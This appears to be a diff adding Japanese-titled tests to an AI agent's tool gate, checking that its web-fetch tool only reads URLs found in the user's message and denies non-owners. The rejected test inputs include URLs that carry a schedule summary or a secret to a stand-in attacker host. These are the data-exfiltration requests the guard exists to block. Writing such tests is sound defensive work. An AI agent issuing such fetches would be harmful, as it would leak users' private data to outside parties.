@@ -10,6 +10,7 @@ import {
 	calendarCreateEvent,
 	calendarListEvents,
 } from "./definitions/calendar.ts";
+import { webFetch } from "./definitions/web.ts";
 import {
 	createCapabilityGate,
 	type PendingStore,
@@ -19,6 +20,7 @@ import {
 import { PENDING_TTL_MS, type PendingOperation } from "./pending.ts";
 import type { CapabilityPolicy } from "./policy.ts";
 import { createToolRegistry } from "./registry.ts";
+import { extractUrls } from "./source-urls.ts";
 
 const T0 = new Date("2026-10-17T03:00:00.000Z");
 
@@ -671,5 +673,83 @@ describe("pending_cancel", () => {
 			reason: "not_owner",
 		});
 		expect(pending.ops.get(id)?.status).toBe("proposed");
+	});
+});
+
+describe("出所を縛る URL", () => {
+	const setupWeb = () => {
+		const calls: CapabilityRequest[] = [];
+		const adapter: CapabilityAdapter = {
+			tools: [webFetch],
+			execute: async (request) => {
+				calls.push(request);
+				return ok({ data: { title: "t" }, summary: "取得" });
+			},
+		};
+		const registry = createToolRegistry([adapter]);
+		if (!registry.ok) throw new Error("登録簿を作れない");
+		const gate = createCapabilityGate({
+			registry: registry.value,
+			policy: { web_read: "auto" },
+			pending: memoryStore().store,
+			now: () => T0,
+		});
+		return { gate, calls };
+	};
+	const fetchUrl = (url: string) => ({ name: "web_fetch", input: { url } });
+	const sourceUrls = extractUrls("これ読んで https://example.com/post?id=1");
+
+	it("新着メッセージの本文にない URL は rejected で、adapter を呼ばない", async () => {
+		const { gate, calls } = setupWeb();
+		for (const url of [
+			"https://attacker.example/?d=予定の要約",
+			"https://example.com/post?id=1&d=secret",
+		]) {
+			const res = await gate.handle(fetchUrl(url), context({ sourceUrls }));
+			expect(res.isError).toBe(true);
+			expect(body(res.content)).toEqual({
+				status: "rejected",
+				reason: "url_not_in_source",
+			});
+			expect(res.record).toMatchObject({
+				tool: "web_fetch",
+				decision: "deny",
+				outcome: "denied",
+				summary: "url_not_in_source",
+			});
+		}
+		expect(calls).toHaveLength(0);
+	});
+
+	it("出所の URL が無いターンでは、どの URL も読まない", async () => {
+		const { gate, calls } = setupWeb();
+		const res = await gate.handle(
+			fetchUrl("https://example.com/post?id=1"),
+			context(),
+		);
+		expect(body(res.content).reason).toBe("url_not_in_source");
+		expect(calls).toHaveLength(0);
+	});
+
+	it("本文にある URL は fragment が違っても通る", async () => {
+		const { gate, calls } = setupWeb();
+		const res = await gate.handle(
+			fetchUrl("https://example.com/post?id=1#comments"),
+			context({ sourceUrls }),
+		);
+		expect(res.isError).toBe(false);
+		expect(calls).toHaveLength(1);
+	});
+
+	it("オーナー以外には、出所の検査より先に denied を返す", async () => {
+		const { gate } = setupWeb();
+		const res = await gate.handle(
+			fetchUrl("https://attacker.example/"),
+			context({ isOwner: false, speakerId: "guest" }),
+		);
+		expect(body(res.content)).toEqual({
+			status: "denied",
+			reason: expect.any(String),
+		});
 	});
 });
